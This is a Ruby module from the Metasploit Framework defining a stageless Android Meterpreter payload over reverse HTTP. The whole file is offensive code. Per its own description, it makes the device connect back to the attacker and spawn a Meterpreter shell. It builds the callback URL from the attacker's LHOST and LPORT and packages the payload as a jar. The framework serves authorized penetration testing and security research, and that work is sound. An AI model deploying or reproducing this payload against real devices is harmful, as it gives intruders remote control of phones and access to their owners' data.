##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'msf/core/handler/reverse_http'
require 'msf/core/payload/transport_config'
require 'msf/core/payload/android'
require 'msf/core/payload/uuid/options'
require 'msf/base/sessions/meterpreter_android'
require 'msf/base/sessions/meterpreter_options'
require 'rex/payloads/meterpreter/config'

module MetasploitModule

  CachedSize = :dynamic

  include Msf::Payload::TransportConfig
  include Msf::Payload::Single
  include Msf::Payload::Android
  include Msf::Payload::UUID::Options
  include Msf::Sessions::MeterpreterOptions


  def initialize(info = {})

    super(merge_info(info,
      'Name'        => 'Android Meterpreter Shell, Reverse HTTP Inline',
      'Description' => 'Connect back to attacker and spawn a Meterpreter shell',
      'License'     => MSF_LICENSE,
      'Platform'    => 'android',
      'Arch'        => ARCH_DALVIK,
      'Handler'     => Msf::Handler::ReverseHttp,
      'Session'     => Msf::Sessions::Meterpreter_Java_Android,
      'Payload'     => '',
      ))
    register_options([
      OptBool.new('AutoLoadAndroid', [true, "Automatically load the Android extension", true])
    ], self.class)
  end

  #
  # Generate the transport-specific configuration
  #
  def transport_config(opts={})
    transport_config_reverse_http(opts)
  end

  def generate_jar(opts={})
    opts[:stageless] = true
    super(opts)
  end

  def payload_uri(req=nil)
    # Default URL length is 30-256 bytes
    uri_req_len = 30 + luri.length + rand(256 - (30 + luri.length))
    # Generate the short default URL if we don't know available space
    if self.available_space.nil?
      uri_req_len = 5
    end

    url = "http://#{datastore["LHOST"]}:#{datastore["LPORT"]}#{luri}"
    # TODO: perhaps wire in an existing UUID from opts?
    url << generate_uri_uuid_mode(:init_connect, uri_req_len)

    url
  end

end
